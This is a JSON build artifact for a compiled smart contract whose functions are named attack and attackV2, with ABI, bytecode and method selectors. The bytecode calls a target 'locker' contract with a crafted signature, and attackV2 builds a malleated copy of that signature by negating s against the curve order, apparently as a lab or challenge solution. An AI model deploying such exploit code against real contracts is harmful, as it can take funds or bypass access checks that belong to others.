{"abi":[{"type":"function","name":"attack","inputs":[{"name":"locker","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"attackV2","inputs":[{"name":"locker","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506102948061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80636235b19014610038578063d018db3e1461004d575b5f5ffd5b61004b6100463660046101e6565b610060565b005b61004b61005b3660046101e6565b610124565b6040516303e8cd5760e41b8152601b600482018190527f79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798602483018190527f96a1b479114876736dfff21e60fc0914efb3fa8a89bbacfe6fc98dae89e7629e60448401819052336064850152849373ffffffffffffffffffffffffffffffffffffffff851690633e8cd570906084015b5f604051808303815f87803b158015610107575f5ffd5b505af1158015610119573d5f5f3e3d5ffd5b505050505050505050565b80601b7f69a1b479114876736e0002e09f0d3f6f4eee263a1dd1b1523a2dcc47c394ef315f6101937f47dc91dc09a382c1961cdc698620c6ab529c66758c3014b65ffb80cf97c107b77ffffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141610220565b6040516303e8cd5760e41b815260ff85166004820152602481018490526044810182905233606482015290915073ffffffffffffffffffffffffffffffffffffffff851690633e8cd570906084016100f0565b5f602082840312156101f6575f5ffd5b813573ffffffffffffffffffffffffffffffffffffffff81168114610219575f5ffd5b9392505050565b81810381811115610258577f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b9291505056fea26469706673582212201a59035c883467ef749ac155b4dab438b86cf6f2501b97359588f66870fe8b2364736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack(address)":"d018db3e","attackV2(address)":"6235b190"},"id":0}